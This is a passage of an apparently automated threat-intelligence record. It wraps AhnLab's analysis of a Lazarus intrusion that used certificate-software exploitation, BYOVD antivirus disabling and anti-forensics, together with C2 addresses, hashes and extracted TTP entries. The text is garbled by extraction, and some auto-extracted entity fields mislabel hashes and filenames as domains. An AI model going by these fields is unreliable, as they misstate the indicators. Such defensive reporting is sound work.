yfvepuvxbi (not secured) 16:18:52Network Accesssvchost.exe attempts to access certificate software port on PC0110.20.XXX.125:XXXXX(PC01) 16:33:06Malicious file creationsvchost.exe creates file C:\\ProgramData\\skypeserver.exe (unsecured) 22/11/18 9:49:31Network Accesssvchost.exe attempts to access certificate software port on PC0110.20.XXX.125:XXXXX(PC01) 9:51:07\uc545\uc131\ud30c\uc77c \uc0dd\uc131 svchost.exe created malicious file C:\\ProgramData\\skypeserver.exe(unsecured) 9:56:31 svchost.exe \uac00 \uc545\uc131\ud30c\uc77c \uc0dd\uc131 C:\\ProgramData\\sfbappsdk.dll ( \ubbf8\ud655\ubcf4 ) 10:00:08C2 \ud1b5\uc2e0 skypeserver.exe\uac00 \uacf5\uaca9\uc790 C2 \uc8fc\uc18c\uc640 \ub124\ud2b8\uc6cc\ud06c \uc5f0 \uacb0 121.78.246.155(dalbinews.co.kr) 10:00:27\ub124\ud2b8\uc6cc\ud06c \uc811\uadfc skypeserver.exe\uac00 \uc778\uc99d\uc11c \uc18c\ud504\ud2b8\uc6e8\uc5b4 \ud3ec\ud2b8\uc5d0 \uc811\uadfc \uc131\uacf5 10.20.XXX.125:XXXXX(PC01) 10:06:14\uc548\ud2f0 \ud3ec\ub80c\uc2dd \uc545\uc131\ud30c\uc77c \uc774\ub984 \ubcc0\uacbd \uc774\ub984 \ubcc0\uacbd : C:\\ProgramData\\sfbappsdk.dll - bxikemvkqhcsz ( \ubbf8\ud655\ubcf4 ) 10:06:42 \uc545\uc131\ud30c\uc77c \uc774\ub984 \ubcc0\uacbd \ubcc0\uacbd \uc804 : C:\\ProgramData\\skypeserver.exe - kqcfqbxrgbfmwem ( \ubbf8\ud655\ubcf4 ) 11:04:32\uc778\uc81d\uc158 C2 \uc5f0\uacb0 \uc815\uc0c1 \ud504\ub85c\uc138\uc2a4 (svchost.exe) \uc5d0 \uc545\uc131 \uc2a4\ub808\ub4dc \uc778\uc81d\uc158 svchost.exe \uac00 \uacf5\uaca9\uc790 C2 \uc8fc\uc18c\uc640 \ub124\ud2b8\uc6cc\ud06c \uc5f0\uacb0 121.78.158.46(studyholic.co.kr) 11:05:45\ubcf4\uc548 \uc81c\ud488 \ubb34\ub825\ud654 V3 \uac00 \ubcf4\uc548 \uc81c\ud488 \ubb34\ub825\ud654 \ud589\uc704 \ud0d0\uc9c0 (Exploit/Win.Lazardoor.GEN) 11:06:56\ucde8\uc57d\ud55c \ub4dc\ub77c\uc774\ubc84 \ud30c\uc77c \uc0dd\uc131 \uc545\uc131\ucf54\ub4dc \uc0dd\uc131 C:\\ProgramData\\perlcritic.exe ( \ubbf8\ud655\ubcf4 ) 11:07:02 \uc545\uc131\ucf54\ub4dc \uc2e4\ud589 C:\\ProgramData\\perlcritic.exe ( \ubbf8\ud655\ubcf4 ) \ucde8\uc57d\ud55c \ub4dc\ub77c \uc774\ubc84 \ud30c\uc77c \uc0dd\uc131 C:\\Windows\\System32\\drivers\\PROCEXP152.SYS( \ud655\ubcf4 ) 11:12:18 \uc545\uc131\ucf54\ub4dc \uc0dd\uc131 \ubc0f \uc2e4\ud589 C:\\ProgramData\\perlcritic64.exe ( \ubbf8\ud655\ubcf4 ) [ \ud45c ] PC02 \uc5d0\uc11c \ubc1c\uacac\ub41c \uacf5\uaca9\uc790\uc758 \uc545\uc131 \ud589\uc704 Major malicious acts 9 / 1 6 Disabling V3 by BYOVD In the PC01 and PC02 systems  an attempt to disable V11 was detected (Exploit/Win.Lazardoor.GEN) at 18/10 20:28:11 and 05:45:3  respectively  and the period after which V3 was disabled is as follows: PC01: 11/18 10:20:28   11/18 11:25:00 (about 1 hour) PC02: 11/18 11:05:45   11/21 14:07:08 (about 75 hours) During this period  V3-related processes are running  but normal behavior detection is not possible. However  after the system reboots  V3 returns to normal. [Picture] V01 Neutralization Detection Log Seen on PC3 Attackers need access to kernel memory to manipulate kernel memory on Windows systems to disrupt the operation of security products  and in May  Taiwanese component manufacturer ENE Technology s ene.sys was used in a BYOVD attack. At the time of detection of V01 incapacitation of PC02 and PC3  no trace of the attack method was found. Rather  a vulnerable driver file was created on the system after the V3 outbreak  which is the driver file of Procexp152 of ProcessExplorer  a process management utility provided .SYS free of charge by Microsoft  and is a vulnerable driver that can be used for BYOVD attacks. However  this driver file was created after V01 defeat on both PC02 and PC3  and was used by the perlcritic.exe (unsecured) file generated by the attacker. In other words  the order of V3 defeat occurrence time and driver file creation time does not match  so it is a BYOVD attack  PROCEXP152. It is not yet possible to say whether SYS was used to neutralize V3. The method that occurred in May and the method that occurred in November have the following differences. 1 0 / 1 6 CATEGORY ATTACK IN MAY 2022 ATTACK INNOVEMBER  2022 AttackTechniquesBYOVDTechnique Not verified Vulnerabledrivers Drivers from ENETechnologyene.sys Microsoft sProcessExplorerdriver was created after V3 disabledPROCEXP152.sys loader sb_smbus_sdk.dllperlcritic.exe(not secured)perlcritic64.exe(unsecured) ServiceregistrationServiceregistered No sign of serviceregistration [Table] Comparison of traces related to V5 incapacitation in May and November Antiforensics PC01 and PC02 were found to have performed antiforensic actions to erase the traces of the attack. CATEGORY SYSTEMDESCRIPTION Manipulatingtimestampson files PC01 PC02 [PC01]C:\\Windows\\System32\\LegacyUserManager.dllManipulated creation time : 2019-03-1913:49:35C:\\ProgramData\\Microsoft\\Crypto\\Keys\\Keys.datManipulated creation time : 2019-03-1913:49:35Manipulated/created time : 2019-12-2523:24:06C:\\ProgramData\\Microsoft\\Settings\\Settings.vwxManipulated creation time : 2022-05-1316:09:19 [PC02] C:\\Windows\\system32\\wptsextensions.dllManipulated creation time : 2019-03-1913:49:35 Delete a fileafter renaming afile PC01 PC02 [PC01]C:\\ProgramData\\tszui.tmp -  phqghumeaC:\\ProgramData\\perlcritic.exe - kxlmatmoynktxlC:\\ProgramData\\tds.tmp -  mxnsbqy [PC02]C:\\ProgramData\\fswss.exe -  xeudsgpfoC:\\ProgramData\\fmsysn.exe -  yfvepuvxbiC:\\ProgramData\\sfbappsdk.dll - bxikemvkqhcszC:\\ProgramData\\skypeserver.exe - kqcfqbxrgbfmwem DeletePrefetch PC01 MSIEXEC.EXE-8FFB1633.pf  PERLCRITIC.EXE-2EB3AC0F.pf and many more 1 1 / 1 6 [Table] Antiforensic Behavior Identified in PC01  PC02 Malware used by attackers List of malware CATEGORY FILENAME SYSTEMDESCRIPTION loader wptsextensions.dllPC02 Path: C:\\Windows\\System32\\wptsextensions.dllLoad Backdoor File Keys.dat legacyusermanager.dllPC01 PC02 Path:C:\\Windows\\System32\\legacyusermanager.dllLoad Backdoor File Keys.dat lum.tmp PC02 Path: C:\\Windows\\Temp\\lum.tmpLoad the backdoor file configmanager.tlb backdoorKeys.dat PC01 PC02 Path:C:\\ProgramData\\Microsoft\\Crypto\\Keys\\Keys.dat loaded by wptsextensions.dll2022/11/18 14:56:54 GMT Designed to run after 9  additional commands can be performed viacmd.exeDownloads additional binaries from the C2 serverand runs them in fileless form Settings.vwx PC02 Loaded in wptsextensions.dllRandomly access from the following 3 C2shxxps://www.artinsight[.]co.kr/data/admin/list.phphxxps://www.kfcjn[.]com/member/process/sms.phphxxps://ctmnews[.]kr/member/process/success.php Settings.vwx PC01 Loaded in legacyusermanager.dllRandomly access from the following 3 C2shxxps://www.artinsight[.]co.kr/data/admin/list.phphxxps://www.kfcjn[.]com/member/process/sms.phphxxps://ctmnews[.]kr/member/process/success.php Exploited legitimatefiles ProcEXP152.sysPC01 PC02 Path:C:\\Windows\\System32\\drivers\\PROCEXP152.SYSDrivers in ProcessExplorerVulnerable driver module enables antivirusneutralization through BYOVD attacks fswss.exe PC02 Path: C:\\ProgramData\\fswss.exeNirSoft utility with the ability to scan the network orturn on a remote computerWakeMeOnLan:https://www.nirsoft.net/utils/wake_on_lan.html 1 2 / 1 6 Unsecured files configmanager.tlb PC02 Path: C:\\Windows\\System32\\configmanager.tlbBackdoor estimation loaded by lum.tmp perlcritic.exe perlcritic64.exePC01 PC02 Path: C:\\ProgramData\\perlcritic.exeExecuted by cmd.exe and loadsPROCEXP152.SYS sfbappsdk.dll PC02 Path: C:\\ProgramData\\sfbappsdk.dllInjected svchost.exe created fmSysN.exe PC02 Path: C:\\ProgramData\\fmSysN.exeInjected svchost.exe createdThe following traces of execution have beenidentified:fmSysN.exe 10.20.XXX.1 10.20.XXX.36XXXXX 10 c:\\programdata\\fmSysN.log skypeserver.exe PC02 Path: C:\\ProgramData\\skypeserver.exeInjected svchost.exe createdC2 Connection tds.tmp PC01 Path: C:\\ProgramData\\tds.tmpDeleted after being changed to a random filename tszui.tmp PC01 Path: C:\\ProgramData\\tszui.tmpDeleted after being changed to a random filename [table] List of malware C2 used by attackers CATEGORY IP DOMAIN REMARKS ftp.exe \ucd5c\ucd08 \uc811 \uadfc 111.92.189.48www[.]scope.co.kr \ubb34\ub825\ud654 \uad00\ub828 C2\ucd94\uc815 121.78.158.46www[.]studyholic.com 121.78.246.155dalbinews[.]co.kr \ubc31\ub3c4\uc5b4 C2 119.207.79.175  5 \uc6d4 \uacf5\uaca9\uc5d0 \ub3c4 \uc0ac\uc6a9\ub428 183.110.224.172ctmnews[.]kr 211.249.220.83ctmnews[.]kr 1.254.179.18www[.]artinsight.co.kr 103.6.182.57www[.]artinsight.co.kr 104.109.245.186www[.]artinsight.co.kr 112.106.58.23www[.]artinsight.co.kr 115.68.52.47www[.]artinsight.co.kr 1 3 / 1 6 125.209.218.167www[.]artinsight.co.kr 3.39.49.255www[.]artinsight.co.kr 34.199.186.157www[.]artinsight.co.kr 52.148.148.114 www[.]artinsight.co.kr 104.21.64.83www[.]kfcjn.com 112.106.58.23www[.]kfcjn.com 114.108.129.89www[.]kfcjn.com 117.52.137.138www[.]kfcjn.com 13.107.21.200www[.]kfcjn.com 162.247.241.2www[.] kfcjn.com 23.50.0.140www[.] kfcjn.com 52.79.120.37www[.] kfcjn.com [table] List of C2s used by attackers MITRE ATT CK MAPPING Tactics TID DESCRIPTION Reconnaissance    ResourceDevelopmentT1587.001DevelopCapabilities:Malware Backdoor andloader fabrication T1587.004DevelopCapabilities:Exploits Prepare forcertificate softwarevulnerabilities T1588.002ObtainCapabilities:Tool fswss.exe(wakemeonlan byNirsoft.exe) Initial AccessN/A Execution T1059.003CommandandScriptingInterpreter:WindowsCommandShell Run perlcritic.exe T1203Exploitationfor ClientExecution CertificateSoftware Exploits PersistenceN/A   1 4 / 1 6 PrivilegeEscalation T1068Exploitationfor PrivilegeEscalation PROCEXP152.sys DefenseEvasion T1562.001ImpairDefenses:Disable orModifyTools V3 Incapacitation T1070IndicatorRemoval Delete Prefetchfiles T1070.004IndicatorRemoval:FileDeletion Delete malicious files  sfbappsdk.dll fswss.exe fmSysN.exe skypeserver.exe perlcritic.exe perlcritic64.exe Delete crashdumpfiles T1070.006IndicatorRemoval:Timestomp Change maliciousfile timeinformation CredentialAccess N/A   Discovery T1046NetworkServiceDiscovery fswss.exe fmSysN.exe LateralMovement T1210Exploitationof RemoteServices Internal movementusing certificatesoftwarevulnerabilities Collection N/A   Command andControl T1071.001ApplicationLayerProtocol:WebProtocols C2ServerCommunication T1102 WebService Exploitinglegitimate domainsas C2 servers Exfiltration N/A   Impact N/A   IoC Malicious files 1 5 / 1 6 No MD5 Hash File Name AhnLab Detection Name 1 61B3C9878B84706DB5F871B4808E739Awptsextensions.dllTrojan/Win.Lazardoor.C5327680 2 C7256A0FBAB0F437C3AD4334AA5CDE06legacyusermanager.dllTrojan/Win.Lazardoor.C5327680 3 A6602EF2F6DC790EA103FF453EB21024lum.tmp Trojan/Win.Lazardoor.C5327681 4 FC8B6C05963FD5285BCE6ED51862F125Keys.dat (PC01)Data/BIN. Lazarus 5 6EA4E4AB925A09E4C7A1E80BAE5B9584Keys.dat (PC02)Data/BIN. Lazarus 6 27DB56964E7583E19643BF5C98FFFD52Settings.vwx (PC01)Data/BIN. Lazarus 7 BD47942E9B6AD87EB5525040DB620756Settings.vwx (PC02)Data/BIN. Lazarus Malicious IP/URL No IP URL Country 1 111.92.189.48www[.] scope.co.kr KR 2 121.78.158.46www[.] studyholic.comKR 3 121.78.246.155dalbinews[.] co.kr KR 4 119.207.79.175  KR 5 183.110.224.172ctmnews[.] kr KR 6 211.249.220.83ctmnews[.] kr KR 7 1.254.179.18www[.] artinsight.co.krKR 8 103.6.182.57www[.] artinsight.co.krKR 9 104.109.245.186www[.] artinsight.co.krUS 10 112.106.58.23www[.] artinsight.co.krKR 11 115.68.52.47www[.] artinsight.co.krKR 12 125.209.218.167www[.] artinsight.co.krKR 13 3.39.49.255www[.] artinsight.co.krUS 14 34.199.186.157www[.] artinsight.co.krUS 15 52.148.148.114 www[.] artinsight.co.krUS 16 104.21.64.83www[.] kfcjn.com US 17 112.106.58.23www[.] kfcjn.com KR 18 114.108.129.89www[.] kfcjn.com KR 19 117.52.137.138www[.] kfcjn.com KR 20 13.107.21.200www[.] kfcjn.com US 21 162.247.241.2www[.] kfcjn.com US 22 23.50.0.140www[.] kfcjn.com US 23 52.79.120.37www[.] kfcjn.com US 1 6 / 1 6 Detailed analysis information on related IOCs can be accessed through the subscription service of AhnLab s next-generation threat intelligence platform  AhnLab TIP . Categories:Malware Information Tagged as:A-FIRST BYOVD DFIR Infringement Case Lazarus",
            "commands": [],
            "file_paths": [
              "/www.artinsight[.]co.kr/data/admin/list.phphxxps:/",
              "C:\\ProgramData\\tds.tmpDeleted",
              "C:\\Windows\\System32\\wptsextensions.dllLoad",
              "c:\\programdata\\fmSysN.log",
              "C:\\ProgramData\\tds.tmp",
              "/Win.Lazardoor.C5327681",
              "C:\\Windows\\Temp\\lum.tmpLoad",
              "C:\\ProgramData\\fswss.exe",
              "C:\\ProgramData\\skypeserver.exe",
              "C:\\ProgramData\\Microsoft\\Crypto\\Keys\\Keys.dat",
              "C:\\ProgramData\\fswss.exeNirSoft",
              "/18.",
              "/11/1516:18:52svchost.exe",
              "C:\\ProgramData\\sfbappsdk.dllInjected",
              "C:\\Windows\\System32\\LegacyUserManager.dllManipulated",
              "C:\\Windows\\System32\\configmanager.tlbBackdoor",
              "C:\\ProgramData\\tszui.tmp",
              "C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportArchive\\AppCrash_XXXXXXXXXXXX.exe",
              "/",
              "C:\\Windows\\System32\\wptsextensions.dll(secured)",
              "C:\\ProgramData\\skypeserver.exe(unsecured)",
              "/Win.Lazardoor.C5327680",
              "C:\\Windows\\System32\\drivers\\PROCEXP152.SYSDrivers",
              "C:\\Windows\\System32\\lecacyusermanager.dll(secured)",
              "C:\\Windows\\System32\\legacyusermanager.dll",
              "C:\\ProgramData\\Microsoft\\Settings\\Settings.vwxManipulated",
              "/www.nirsoft.net/utils/wake_on_lan.html",
              "C:\\ProgramData\\fswss.exe(unsecured)",
              "/BIN.",
              "C:\\Windows\\System32\\legacyusermanager.dllLoad",
              "C:\\Windows\\System32\\drivers\\PROCEXP152.SYS(",
              "C:\\Windows\\system32\\wptsextensions.dllManipulated",
              "C:\\Windows\\temp\\lum.tmp",
              "C:\\ProgramData\\perlcritic64.exe",
              "C:\\ProgramData\\fmSysN.exe10.20.XXX.1",
              "/www.kfcjn[.]com/member/process/sms.phphxxps:/",
              "C:\\ProgramData\\fmsysn.exe",
              "C:\\ProgramData\\perlcritic.exe",
              "/stextC:\\ProgramData\\fswss.log",
              "/ctmnews[.]kr/member/process/success.php",
              "C:\\ProgramData\\fmSysN.exeInjected",
              "C:\\ProgramData\\Microsoft\\Crypto\\Keys\\Keys.datManipulated",
              "C:\\ProgramData\\tszui.tmpDeleted",
              "/IPAddressFrom10.20.XXX.1",
              "C:\\ProgramData\\perlcritic.exeExecuted",
              "C:\\ProgramData\\sfbappsdk.dll",
              "/Win.Lazardoor.GEN)",
              "C:\\ProgramData\\skypeserver.exeInjected"
            ],
            "registry_keys": []
          },
          "entities": {
            "malware": [
              "Backdoor",
              "Trojan",
              "conti",
              "loader",
              "malware",
              "rat"
            ],
            "tools": [
              "PING",
              "at",
              "cmd",
              "net",
              "reg",
              "sc"
            ],
            "threat_actors": [
              "Lazarus Group"
            ],
            "ips": [
              "111.92.189.48",
              "114.108.129.89",
              "115.68.52.47",
              "119.207.79.175",
              "121.78.158.46",
              "121.78.246.155",
              "183.110.224.172",
              "52.148.148.114"
            ],
            "domains": [
              "10.20.XXX",
              "27DB56964E7583E19643BF5C98FFFD52Settings.vwx",
              "37C2communicationsvchost.exe",
              "47C2communicationsvchost.exe",
              "52svchost.exe",
              "61B3C9878B84706DB5F871B4808E739Awptsextensions.dllTrojan",
              "6EA4E4AB925A09E4C7A1E80BAE5B9584Keys.dat",
              "A6602EF2F6DC790EA103FF453EB21024lum.tmp",
              "Accesssvchost.exe",
              "Application.evtx",
              "BD47942E9B6AD87EB5525040DB620756Settings.vwx",
              "C7256A0FBAB0F437C3AD4334AA5CDE06legacyusermanager.dllTrojan",
              "ENETechnologyene.sys",
              "FC8B6C05963FD5285BCE6ED51862F125Keys.dat",
              "IPAddressFrom10.20.XXX",
              "Keys.dat",
              "Keys.datManipulated",
              "LegacyUserManager.dll",
              "LegacyUserManager.dllManipulated",
              "MSIEXEC.EXE-8FFB1633.pf",
              "PC0110.20.XXX",
              "PERLCRITIC.EXE-2EB3AC0F.pf",
              "PROCEXP152.SYS",
              "PROCEXP152.SYSDrivers",
              "PROCEXP152.sys",
              "SVChost.exe",
              "Settings.vwx",
              "Settings.vwxManipulated",
              "Win.Lazardoor",
              "Win.Lazardoor.GEN",
              "artinsight.co.kr",
              "artinsight.co.krKR",
              "artinsight.co.krUS",
              "asec.ahnlab.com",
              "backdoorKeys.dat",
              "byNirsoft.exe",
              "cmd.exe",
              "co.kr",
              "communicationftp.exe",
              "communicationsvchost.exe",
              "configmanager.tlb",
              "configmanager.tlbBackdoor",
              "creationftp.exe",
              "creationsvchost.exe",
              "ctmnews.kr",
              "dalbinews.co.kr",
              "disabledPROCEXP152.sys",
              "dllperlcritic.exe",
              "ene.sys",
              "exeskypeserver10.20.XXX",
              "filessvchost.exe",
              "fmSysN.exe",
              "fmSysN.exe10.20.XXX",
              "fmSysN.exeInjected",
              "fmSysN.log",
              "fmsysn.exe",
              "fswss.exe",
              "fswss.exeNirSoft",
              "fswss.log",
              "ftp.exe",
              "kfcjn.com",
              "lecacyusermanager.dll",
              "legacyusermanager.dll",
              "legacyusermanager.dllLoad",
              "legacyusermanager.dllRandomly",
              "lightingmart.co.kr",
              "list.phphxxps",
              "loadsPROCEXP152.SYS",
              "lum.tmp",
              "lum.tmpLoad",
              "networkconnection10.20.XXX",
              "perlcritic.exe",
              "perlcritic.exeExecuted",
              "perlcritic64.exe",
              "scope.co.kr",
              "sfbappsdk.dll",
              "sfbappsdk.dllInjected",
              "skypeserver.exe",
              "skypeserver.exeInjected",
              "sms.phphxxps",
              "studyholic.co.kr",
              "studyholic.com",
              "studyholic.comKR",
              "success.php",
              "svchost.exe",
              "tds.tmp",
              "tds.tmpDeleted",
              "tszui.tmp",
              "tszui.tmpDeleted",
              "viacmd.exeDownloads",
              "wptsextensions.dll",
              "wptsextensions.dllLoad",
              "wptsextensions.dllManipulated",
              "wptsextensions.dllRandomly",
              "www.artinsight",
              "www.artinsight.co.kr",
              "www.kfcjn",
              "www.kfcjn.com",
              "www.nirsoft.net",
              "www.scope.co.kr",
              "www.studyholic.com"
            ],
            "hashes": {}
          },
          "ttp_indicators": {
            "initial_access": [
              "Exploit Public-Facing Application"
            ],
            "execution": [
              "Command and Scripting Interpreter"
            ],
            "persistence": [
              "Create or Modify System Process"
            ],
            "defense_evasion": [
              "Process Injection"
            ],
            "discovery": [
              "Network Service Discovery"
            ],
            "lateral_movement": [
              "Remote Services"
            ],
            "collection": [
              "Archive Collected Data"
            ],
            "command_and_control": [
              "Application Layer Protocol"
            ]
          },
          "context": "\n**File System Activity:**\n- /www.artinsight[.]co.kr/data/admin/list.phphxxps:/\n- C:\\ProgramData\\tds.tmpDeleted\n- C:\\Windows\\System32\\wptsextensions.dllLoad\n- c:\\programdata\\fmSysN.log\n- C:\\ProgramData\\tds.tmp\n\n**Network Indicators:**\n- wptsextensions.dllLoad\n- Accesssvchost.exe\n- LegacyUserManager.dll\n- exeskypeserver10.20.XXX\n- artinsight.co.krUS\n- backdoorKeys.dat\n- fmSysN.exe10.20.XXX\n- Application.evtx\n- co.kr\n- Win.Lazardoor\n\n**Key Security Terms:** exploitation, malware, inject, cmd, script, execute, download, modify, privilege, persistence"
        },
        "metadata": {
          "extraction_method": "LangChain-Enhanced",
          "nlp_processing_time_ms": 18.003999999999998,
          "llm_processing_time_ms": 4438.048
        }
      }
    ],
    "ttps": [
      {
        "ttp_id": "bba25381-6130-4151-9d90-0bb39e54a70d",
        "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
        "technique_name": "Lateral Movement",
        "attack_id": "T1021",
        "tactic": "Lateral Movement",
        "description": "Lateral movement using 0-Day vulnerability of company A's certificate program",
        "confidence_score": 0.726,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.23,
          "tool_mentions": 1.0,
          "context_richness": 0.96,
          "multiple_sources": 0.5
        },
        "indicators": [
          "0-Day vulnerability",
          "company A's certificate program"
        ],
        "tools": [
          "at",
          "PING",
          "reg",
          "malware",
          "msiexec",
          "sc",
          "net",
          "ftp",
          "cmd"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "d341151e-6e69-438a-be75-243a09a5038c",
        "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
        "technique_name": "Anti-Forensics",
        "attack_id": "T1112",
        "tactic": "Defense Evasion",
        "description": "Anti-forensics and timestamp operation",
        "confidence_score": 0.705,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.092,
          "tool_mentions": 1.0,
          "context_richness": 0.96,
          "multiple_sources": 0.5
        },
        "indicators": [
          "anti-forensics",
          "timestamp operation"
        ],
        "tools": [
          "at",
          "PING",
          "reg",
          "malware",
          "msiexec",
          "sc",
          "net",
          "ftp",
          "cmd"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "ba849ac3-5f71-40ba-bfa7-765e151eb3b7",
        "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
        "technique_name": "Command and Scripting Interpreter",
        "attack_id": "T1059",
        "tactic": "Execution",
        "description": "Use of command line tools such as PING, at, cmd, net, reg",
        "confidence_score": 0.687,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.7,
          "description_detail": 0.276,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "PING",
          "at",
          "cmd",
          "net",
          "reg"
        ],
        "tools": [
          "at",
          "PING",
          "reg",
          "sc",
          "msiexec",
          "net",
          "ftp",
          "cmd"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "697d573e-2d1f-4932-a47a-88784943cbef",
        "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
        "technique_name": "Exploitation for Privilege Escalation",
        "attack_id": "T1068",
        "tactic": "Privilege Escalation",
        "description": "The attackers took advantage of a 0-Day vulnerability in the public certificate software to escalate privileges",
        "confidence_score": 0.683,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.368,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "0-Day vulnerability",
          "public certificate software"
        ],
        "tools": [
          "at",
          "PING",
          "reg",
          "malware",
          "msiexec",
          "sc",
          "net",
          "ftp",
          "cmd"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "af5e227c-3290-462a-b4cf-c2c8143ebbd6",
        "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
        "technique_name": "Disable or Evade Security Tools",
        "attack_id": "T1562.001",
        "tactic": "Defense Evasion",
        "description": "The attackers defeated the security product using a technique called BYOVD, which exploits a vulnerable driver kernel module",
        "confidence_score": 0.68,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.9,
          "ioc_evidence": 0.58,
          "description_detail": 0.414,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "BYOVD",
          "vulnerable driver kernel module"
        ],
        "tools": [
          "at",
          "PING",
          "reg",
          "malware",
          "msiexec",
          "sc",
          "net",
          "ftp",
          "cmd"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "33a44086-54a7-45ff-aff6-5f9ab536e147",
        "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
        "technique_name": "Exploitation of Public-Facing Application",
        "attack_id": "T1190",
        "tactic": "Initial Access",
        "description": "Lazarus attack group exploited a public certificate software vulnerability widely used by public institutions and universities",
        "confidence_score": 0.677,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.368,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "asec.ahnlab.com/ko/48416"
        ],
        "tools": [
          "at",
          "PING",
          "Malware",
          "reg",
          "sc",
          "msiexec",
          "net",
          "ftp",
          "cmd"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "03715787-5dbd-4bc4-8341-26af0cf2827a",
        "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
        "technique_name": "Masquerading",
        "attack_id": "T1036",
        "tactic": "Defense Evasion",
        "description": "Use the same file name as the system file name to masquerade as a legitimate file",
        "confidence_score": 0.677,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.368,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "system file name masquerading"
        ],
        "tools": [
          "at",
          "PING",
          "reg",
          "malware",
          "msiexec",
          "sc",
          "net",
          "ftp",
          "cmd"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "54e1c24e-583b-4153-ae73-2cf486f118cc",
        "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
        "technique_name": "Exploitation for Client Execution",
        "attack_id": "T1203",
        "tactic": "Execution",
        "description": "Exploitation of certificate software vulnerabilities",
        "confidence_score": 0.657,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.66,
          "description_detail": 0.115,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "certificate software vulnerability",
          "AppCrash",
          "svchost.exe",
          "ftp.exe"
        ],
        "tools": [
          "at",
          "PING",
          "ftp.exe",
          "reg",
          "sc",
          "msiexec",
          "svchost.exe",
          "ftp",
          "net",
          "cmd"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "7abee364-2169-4717-9802-46c6e6fff48d",
        "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
        "technique_name": "Indicator Removal",
        "attack_id": "T1070",
        "tactic": "Defense Evasion",
        "description": "Deletion of Prefetch files and crash dump files",
        "confidence_score": 0.656,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.184,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "Prefetch files",
          "crash dump files"
        ],
        "tools": [
          "at",
          "PING",
          "reg",
          "sc",
          "msiexec",
          "svchost.exe",
          "ftp",
          "net",
          "cmd"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "2254ec56-c151-4b9f-93a2-3d05a0a883e7",
        "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
        "technique_name": "Indicator Removal",
        "attack_id": "T1070.004",
        "tactic": "Defense Evasion",
        "description": "Deletion of malicious files",
        "confidence_score": 0.656,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.9,
          "ioc_evidence": 0.74,
          "description_detail": 0.092,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "sfbappsdk.dll",
          "fswss.exe",
          "fmSysN.exe",
          "skypeserver.exe",
          "perlcritic.exe",
          "perlcritic64.exe"
        ],
        "tools": [
          "at",
          "PING",
          "reg",
          "sc",
          "msiexec",
          "svchost.exe",
          "ftp",
          "net",
          "cmd"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "2c70d694-24a1-4320-bcb0-35c244a82a51",
        "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
        "technique_name": "Exploitation of Remote Services",
        "attack_id": "T1210",
        "tactic": "Lateral Movement",
        "description": "Exploitation of certificate software vulnerabilities for lateral movement",
        "confidence_score": 0.656,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.184,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "certificate software vulnerability",
          "svchost.exe"
        ],
        "tools": [
          "at",
